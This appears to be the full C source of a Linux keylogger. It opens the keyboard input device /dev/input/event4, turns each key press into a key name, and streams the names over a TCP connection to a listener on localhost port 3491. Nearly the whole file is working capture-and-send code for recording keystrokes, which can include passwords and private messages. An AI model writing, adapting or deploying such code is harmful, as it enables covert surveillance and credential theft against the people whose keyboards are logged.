#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netdb.h>
#include <stdio.h> 
#include <linux/input.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include "defs.h"

#define PORT "3491"
#define NUM_KEYCODES 71

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

int stop = 1;
void handle_sigint(int sig) 
{
	stop = 0;
    printf("Caught signal %d\n", sig); 
} 

/*
*Return 1 if writing to the file_desc by str pointer made succesfully,
*else it will return 0.
*/
int write_all(int file_desc, const char *str)
{
	int bytesWritten = 0;
	int bytesToWrite = strlen(str) + 1;

	do{
		bytesWritten = write(file_desc, str, bytesToWrite);

		if(bytesWritten == -1)
			return 0;

		bytesToWrite -= bytesWritten;
		str += bytesWritten;
	}while(bytesToWrite > 0);

	return 1;
}

/*
*SIGPIPE - Sent to a process if it tried to write to a socket that had
*been shutdown for writing or isn't connected. The default behaviour
*for this signal is to end the process. So we will create this function
*below to Wrapper around write_all which exits safely if the write fails, without
*the SIGPIPE terminating the program abruptly.
*/
void safe_write_all(int file_desc, const char *str, int keyboard_fd)
{
	struct sigaction new_actn, old_actn;
	new_actn.sa_handler = SIG_IGN;
	sigemptyset(&new_actn.sa_mask);
	new_actn.sa_flags = 0;

	sigaction(SIGPIPE, &new_actn, &old_actn);

	if(!write_all(file_desc, str))
	{
		close(file_desc);
		close(keyboard_fd);
		perror("\nwriting");
		exit(1);
	}

	sigaction(SIGPIPE, &old_actn, NULL);
}

/*
*setup_addrinfo will place for us the relevant value (Among other things,
*it will include the criteria for selecting the socket address) to 'addrinfo'
*struct value (e.g. servoinfo)
*/
void setup_addrinfo(struct addrinfo **servinfo, char *hostname, char *port, int flag)
{
	struct addrinfo hints;
	int rv;

	memset(&hints, 0, sizeof(hints)); // Zero the whole structure before use with memset()
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = flag;

	if((rv = getaddrinfo(hostname, port, &hints, servinfo)) != 0) // Allocates and initializes servinfo
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		freeaddrinfo(*servinfo);
		exit(1);
	}
}

int get_socket_file_descriptor(char *hostname, char *port)
{
	int sockfd;
	struct addrinfo *servinfo, *p;
	char s[INET_ADDRSTRLEN];

	setup_addrinfo(&servinfo, hostname, port, 0);

	//Connect to the first possible result
	for(p = servinfo; p != NULL; p = p->ai_next)
	{
		if((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1)
		{
			perror("socket");
			continue;
		}

		if(connect(sockfd, p->ai_addr, p->ai_addrlen) == -1)
		{
			perror("connect");
			continue;
		}

		break;
	}

	if(p == NULL)
	{
		fprintf(stderr, "failed to connect\n");
		freeaddrinfo(servinfo);
		exit(1);
	}
	inet_ntop(p->ai_family, &(((struct sockaddr_in *)p->ai_addr)->sin_addr),s ,sizeof(s));// Converts IP address from binary to text.
	printf("connecting to %s\n", s);

	freeaddrinfo(servinfo);
	return sockfd;
}

int main(int argc, char *argv[])
{
	char *device = "/dev/input/event4";
	char dev_name[256];
	int keyboard_fd = -1, rb = 0, i, status, writeout;
  	int size = sizeof(struct input_event);
	struct input_event events[NUM_KEYCODES];

	signal(SIGINT, handle_sigint);

	keyboard_fd = open(device, O_RDONLY);

	if(keyboard_fd < 0){
		fprintf(stderr, "Can't open the device, note that only superuser can open the device.\n");
		CLEAN(EXIT_FAILURE);
	}

	if(ioctl(keyboard_fd, EVIOCGNAME(sizeof(dev_name)), dev_name) < 0){
		fprintf(stderr, "Can't figure the name of the device\n");
		CLEAN(EXIT_FAILURE);
	}

	writeout = get_socket_file_descriptor("127.0.0.1", PORT);

	while(stop)
	{
		rb = read(keyboard_fd, events, size * 64);

		for(i = 0; i < (rb / size); ++i)
		{
			if(events[i].type == EV_KEY){
				if(events[i].value == 1){
					if(events[i].code > 0 && events[i].code < NUM_KEYCODES){
						safe_write_all(writeout, keycodes[events[i].code], keyboard_fd);
						safe_write_all(writeout, "\n", keyboard_fd);
					}
					else{
						write(writeout, "UNRECOGNIZED VALUE", sizeof("UNRECOGNIZED VALUE"));
					}
				}
			}
		}
	}
	if(rb > 0) safe_write_all(writeout, "\n", keyboard_fd);
	CLEAN(EXIT_SUCCESS);

cleanup:
	if(fcntl(keyboard_fd, F_GETFD) != -1 || errno != EBADF)
		close(keyboard_fd);

	if(events != NULL)
		memset(events, 0, sizeof(struct input_event)*64);

	return status;
}
